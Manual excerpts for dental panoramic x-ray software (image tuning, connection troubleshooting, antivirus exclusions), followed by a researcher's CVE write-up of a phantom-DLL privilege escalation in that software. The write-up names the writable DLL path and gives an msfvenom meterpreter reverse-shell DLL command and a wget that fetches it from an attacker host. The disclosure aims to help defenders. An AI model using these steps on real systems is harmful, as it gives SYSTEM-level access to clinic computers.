Helpful hints on making your panoramic images better!

After taking a panoramic x-ray there are two main tools that we prefer everybody use before the image

is saved.  Those two tools are the Equal Vertical tool and adjusting the Histogram graph.

Equal Vertical tool

Description:  The Equal Vertical tools will equalize the columns in the image.  This should be the first tool

used after taking a panoramic x-ray.  For example, the center of the image is generally lighter because of the
spinal shadow due to the position of the patient.  To help minimize this “shadow” of the spine in the image,
using the tool will darken the middle and lighten the sides, balancing the difference in darkness across the
image.

The Equal Vertical tool is located under the Enhance button to view the buttons beneath.

15 | P a g e

Below is an example when using the Equal Vertical tool.

Before the Equal Vertical tool is used:

After the Equal Vertical tool is used:

16 | P a g e

Adjusting the Histogram

After the Equal Vertical tool is used, it is best to adjust the brightness and contrast to get the best detail out of
the x-ray.  This is the second tool that should be used after taking a panoramic x-ray.  This tool is called the Histogram.

As seen in the examples above, there are three small green triangles at the bottom of the tool.  Moving these

triangles side-to-side will adjust the brightness and contrast values of the image.  To move the triangles simply left-click
the triangle using the mouse and drag them side to side.  When the triangle is in its desired position, release the left-
mouse button.  Be careful not to overlap the triangles when adjusting them, otherwise the software will not know which
triangle to move.  To best learn this tool, adjust the triangles and notice the difference in the image after the
adjustment.  Utilizing this tool can greatly improve the quality of the x-rays.

The farthest right triangle, usually seen as green outline with black in the center, controls the contrast or
darkness (dark levels) of the image.  The default position for this triangle is against the far right side.  This should be the
first triangle to be moved.

The middle triangle, usually seen as the green outline with blue center, controls the brightness of the image.

The default position for this triangle is right in the center.  This is the second triangle to be moved.

The farthest left triangle, usually seen as green outline with white center, controls the whiteness (white levels)
of the image.  The default position for this triangle is against the far left side.  This triangle should normally be ignored
and kept in its default position.

Since every individual has a different opinion about getting the best detail with an x-ray, there is no set of rules

of how the x-ray should look.  Therefore the best way to decide this ask the doctor (or talk amongst the group) and
decide what key parts in the x-ray are needed to be in focus and given attention to.  The person that will usually take the
x-ray needs to be aware of what is needed, otherwise most (if not every) x-ray will not be to the doctor’s liking.  This is
why communication is key when viewing/saving x-rays.

17 | P a g e

As an example on how to use this Histogram tool, adjust the contrast (most right) triangle from right to left until

you start to see “burn out” in the jawbone or skeletal figure. (See below)

Then adjust the brightness (middle) triangle side-to-side until you get the detail and clarity in the roots of the

teeth.  Getting the detail desired may require you to re-adjust the contrast and brightness triangles more than once.  Do
not be afraid to take some time if you feel you can get a better image.  If you are unsure ask the doctor or another staff
member if the detail you have is acceptable or not.  There is no wrong adjustment; it all falls on personal preference.

Note:  Patient positioning and correct kvp usage directly reflects the potential detail seen in
the image.

Below is an example when using the Histogram (or Image controls) tool.

19 | P a g e

Troubleshooting Not Connected Status (GLAN)

Estimated Time:  2-20+ minutes

Note:  Some instructions reference the steps used in the installation guide mentined above.

These steps will be easier for an IT person to follow having computer experience.

Check Software Diagnostics

Check the software diagnostics for Frame Grabber Information.  Under the Tools menu from the top, choose
Maintenance, and then Diagnostics.

The diagnostics screen shows (below in red) the software version 9.1.2.7600

The Frame grabber Information is blank.   This is where the INTEL CT DESKTOP ADAPTER should be listed.

This tells us the software is not connected to the interface card.

To best rule out any software ‘hang-ups’ or ‘freezes’, restart the background service process.

20 | P a g e

RESTARTING THE BACKGROUND SERVICE

(Important)  To restart the background service, first CLOSE the PANORAMIC DENTAL IMAGING Software

Open up the Services list by right-clicking ‘This PC’ on the desktop and choosing Manage.  If this icon is not on the
desktop, you can enable this in the control panel/settings > Display/Themes.  Or type This PC from the start menu, and
right-click on the best match in the list, and click on Manage

Under the Services and Applications category, expand and then click on Services (left).   The list of system processes are
listed on the right.   Find ‘CCS Service’ in the list, highlight, and then click on the ‘Restart’ link to the top left.

21 | P a g e

The background service can also be restarted by using the start menu search for “Stop Dental” and “Start Dental”

Open the Stop Dental Service program/command first.

Afterwards you’ll see a small box show a message “waiting for service to stop”

After the small box has disappeared, you can then Open the Start Dental Service program/command.

Again you will see a small box show a message “waiting for service to start”

22 | P a g e

These commands are also listed under the Start Menu > Panoramic Dental Imaging >

Note:  If the Panoramic Dental Software is opened when the background service is NOT running, an error message will
appear as below.  To correct this, start the background service as described above, and then the program can be opened.

SOLVED?  Read the possible reasoning below; otherwise continue to the next steps…

If restarting the background service fixes the connection issue, it would suggest that software is not running the latest
version (and should be updated to v9.1.2.7600), or more likely that the computer was previously put to sleep/hibernate.
This is also shared with the FAST STARTUP option being enabled in the power options of the computer with Windows 10,
turn this feature off.  For directions on how to do this refer to the Installation setup guide above, on page 5.

Restarting specifically from a Windows Update can also have this effect.  Restarting the computer a 2nd time is a more
reliable restart of the Operating System and its resources.

23 | P a g e

Third-Party Interference?

Next evaluate any software-based firewalls.  Check the settings of those programs to best assure they are not
monitoring or conflicting with the Pano NIC.  Anti-Virus and Firewall software does not know that the interface is
connected directly to an x-ray machine.  It merely knows that it is a gateway to the outside.  Checking the properties of
the NIC to ensure no added protocols are listed/checked.

Temporarily Disable the software protection to see if the status of the software changes to GREEN.

As an example:  Symantec Anti-Virus client protection software will block the pano connection, unless Allow IP Traffic is
enabled within the Firewall options.  With this enabled, the connection within the Panoramic software goes GREEN and
the firewall can stay active.  Conflicts have also been seen with software-based firewalls like Avast, AVG, Webroot, and
others.

Folders and Directories to exclude from Anti-Virus monitoring are:

C:\ProgramData\Ajat\

C:\Program Files (x86)\Panoramic\

Processes to exclude from Anti-Virus monitoring are:

C:\Program Files (x86)\Panoramic\ccservice.exe

C:\Program Files (x86)\Panoramic\prtestapp.exe

C:\Program Files (x86)\Panoramic\srvtester.exe

24 | P a g e

Verify the Interface Card

Within the network connections window (then change adapter options), If the Network Connection icon is
blue/connected, continue the steps from the next page)

If the icon has a Red X indicating a connection issue, it would suggest there is a more physical connection issue or power
issue with the sensor.

If there is a physical connection issue, check to make sure the Ethernet datacable from the Pan machine is connected.

If the connection goes through the wall, try to hook up a replacement Ethernet cable ran outside of the wall to best test
against the first cable/connection for any interference or if the cable is broken.  This is more common than you think.

Unplug & replug any junction points between the computer and the Pano machine.

25 | P a g e

The Panoramic Dental Imaging Software will only connect to an INTEL BRAND interface card.  This usually is listed as an
INTEL DESKTOP CT ADAPTER, however the software can interface with any network card under the Intel / Broadcom
umbrella which has the Jumbo Packets feature.

(Important) To avoid software glitches, problems, etc; ensure the Panoramic Software is closed and the background
service is STOPPED when making any changes to the NIC ‘grabber’.  After changes have been made, start the service
again to check the software status.

If the computer has two INTEL brand NICs, then ensure the software is pointing/using the correct interface.  If the
computer does not have two Intel NICs, then continue onto the next page.

1.  With the background service stopped, go to the properties of the NIC that is NOT used for the Pano, and uncheck
the SNAP GigE protocol.  Ensure the SNAP GigE protocol is enabled on the Pano NIC.  Then start the background
service as described earlier on page 2 (CCS Service)

2.  Within the Panoramic Dental Software, under the Tools menu, choose Settings.  (screenshots below for reference)
3.  Under the Grabber tab, ensure the Correct Intel device is selected.  Restart the computer if desired to check the

software status.

26 | P a g e

With the background service stopped, check the properties of the Intel NIC to see if they match the installation guide
mentioned above.  (pages 7-9)

If no changes were needed, then Disable the NIC and then Enable.  This can be done through the right-click shortcut
menu on either network connections or the Computer Management / Device manager window (shown above on pg 2).

After the command to Enable the NIC, check the device manager to see if the NIC is flagged for having a problem.

If the NIC disappears from the Network Connections window, then it should be found flagged in the device manager.

27 | P a g e

If found flagged, right-click the grabber and Uninstall device.  A reboot of the computer is required for the Windows
Operating System to reinstall this device.  After a computer reboot stop the background service, and reconfigure the NIC
according to the installation guide above, pages 7-9.  Then stop/start the background service and check the software
status.

SOLVED?  Read the possible reasoning below; otherwise continue to the next steps…

If the Network Interface Card was flagged by the device manager this can be caused by the card having an internal
problem or Windows tried to make changes to this device that did not work (perhaps from a Windows driver Update).
This flagged status shows an issue from the card with the computer.  It has nothing to do with the Digital Pano machine
or Pano software.  If this continues, try moving the NIC to a different PCIe position on the inside of the computer, or a
replacement Intel NIC may be needed.  Consult an IT person(s) for help on this task.  A replacement NIC can be ordered
from Panoramic Corporation.

28 | P a g e

(Uncommon) Using the srvtester Application

Using the srvtester.exe application is quite uncommon.  Most connection issues that are software-based are resolved
using the instructions above.  Of the very few instances where this tool is needed to correct a connection issue, it is
more used on new computer installation/setups than not. First CLOSE the PANORAMIC DENTAL IMAGING Software.

Then Right-click the desktop icon and choose Open file location.

In the Program directory, beneath this file is another

called srvtester.exe.  Right-click this file and choose Open.

An Error message will appear.   This is only a warning/information message.  It is not truly an error.  Click OK.

Be patient as the software will stop/start some

background processes.  This takes roughly 5 seconds

depending on computer specifications / performance.

29 | P a g e

Once the application opens, click the Grabbers button in the TOP LEFT.

Choose the Intel grabber and click Connect.

If the Intel grabber is not listed, then close the

application and re-run with Administrator Rights.

BE PATIENT!!!   The software will want to Start/Stop the background process as you exit & reopen the program.

There is a real-time log of the event in the bottom left of the screen showing

a connection was successful.  If there are error codes, it would suggest a

problem with the card, or may need to be physically reinserted into the PC.

30 | P a g e

Next click the Cameras button in the TOP LEFT.

The software will take a brief moment to Detect the camera, and then display the list.

Click on the sensor shown, and click the Connect button.

31 | P a g e

Again the real-time log will show a camera successfully connected.

After a successful connection, close the srvtester application.

The program will stop/start the background process.  Please wait.

After the notice disappears, wait 2 seconds and then Open the Panoramic Dental Software from the desktop shortcut.

You should find a GREEN Connection in the top left.

32 | P a g e

If the connection was resolved using the srvtester.exe application, this means that the automatic connection feature
within the program could not detect key functions/settings and needed to be told how to connect.  This can occur if there
were complications during the software installation guide, or if the grabber was not in the PC at the time the software
was installed.  As uncommon as this is, whenever used, it typically is on a new setup/installation of a computer.

## Introduction

Originally, this was going to be a write-up on DLL proxying in some dental x-ray machine software, but I stumbled upon a DLL in my research that made me double check it, ultimately finding a privilege escalation vulnerability which got me a CVE.
Early on in my tech career, I used to do tech support for a dental x-ray machine manufacturer before it closed down. I remember the bugs that would come up while working there and always thought it would be a good idea to try to find vulnerabilities in that software. So, seeing as the software is still in use today, I decided to see if I could do anything cool with it now that I'm out of the software support game. I remember some time ago early on in my cyber security studies there were a few juicy hijackable DLLs in that software, I decided I would take a shot at DLL proxying to see if I can get a malicious DLL running while keeping that software functional (really stealthy). Here's the process I followed and how I accidentally discovered a privilege escalation vulnerability that can (theoretically) survive a clean wipe and reinstall of the OS. Hopefully this is useful information for Blue Teamers.

## Final Version of the Software

One thing to note is this software is no longer receiving updates but I know the x-ray machines are still in use around the US today, so there's still some potential risk to this vulnerability. It can be downloaded [here](https://pancorp.com/software/files/PANCORP_DENTAL_IMAGING_9.1.2.7600.exe) along with the software manual [here.](https://pancorp.com/pdf/Panoramic-Dental-Imaging-%28GLAN%29-Windows-10x64-Setup-Rev3.pdf) Another thing to note is IF this software is in use, there's a 99% chance the processes that run and the following locations are whitelisted in whatever ERD/AV is in use, this is also mentioned on page 24 of the software manual. In this write-up I'm going to do the same thing and add these exclusions to match how this software would be installed in every dental office.

1. C:\Program Files (x86)\Panoramic
2. C:\ProgramData\Ajat

## Searching for Hijackable DLL

After the software is installed and exclusions are added, we fire up Process Monitor and start searching. Add the following filters and restart the "CCS Service" in Services:

1. Process Name is ccsservice.exe then Include
2. Path ends with .dll then Include

Once that populates, you'll notice there are a bunch of hijackable DLLs in this software. You'll see numerous "NAME NOT FOUND" results with a "SUCCESS" for the same DLL, just in a different location right after it. I was scrolling through one day searching for a decent one to try proxying with, and almost all the way to the bottom something caught my eye...

Could it be?? IT IS. This is a phantom DLL being invoked with SYSTEM integrity from a User writeable location.
Essentially, this is a DLL that wouldn't be good for proxying as there's no actual DLL located somewhere on the machine, so windows is going to try to invoke it from a predefined set of folders in a specific order.

1. The directory from which the application loaded
2. The system directory
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. The directories that are listed in the PATH environment variable

And in our scenario the 5th location is `C:\ProgramData\Ajat\panoramic\datastor\lnrdlib.dll`
and this location all Users have read, write, and execute permissions. To top it off, this location is a child folder of `C:\ProgramData\Ajat\` which should be whitelisted in every environment this is in use.

## Setting up the attack

Here's the network setup for this test:

* Kali - 10.0.1.137
* Windows 10 64x - 10.0.1.128

Let's start off with creating a simple vanilla meterpreter dll since we don't really need to worry about AV, then spin up an http server to transfer it.

```
## msfvenom to make dll
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.1.137 LPORT=443 -f dll > lnrdlib.dll

## python http server
python3 -m http.server 80

```

Back over on Windows, lets switch to our standard user account, open powershell, and navigate on over to that datastor folder and run the following:
`wget http://10.0.1.137/lnrdlib.dll -outfile lnrdlib.dll`

## Exploit

If everything was done correctly all we need to do to trigger the exploit is restart the computer (since that's something a normal user can do, restarting the CCS Service will also trigger this).

SUCCESS!!!

## Persistence after OS install

Now, one of the key things about the datastor location is that it's one of the two locations that should be backed up in case the computer needs to be wiped or replaced for whatever reason and the software reinstalled. If the contents of the `calib` folder are lost, a technician will need to come out and recalibrate the x-ray machine to get those back. If the `datastor` files are lost, then you lose the most recent x-ray images that weren't saved yet, so this location is somewhat optional to backup. This location is where the malware will reside so it's theoretically possible for someone to accidentally re-infect a computer with the malware if they restore the contents of a backed up datastor, that had the malware and all those recent x-ray images taken, in the new computer. This is mentioned on page two of the software manual.
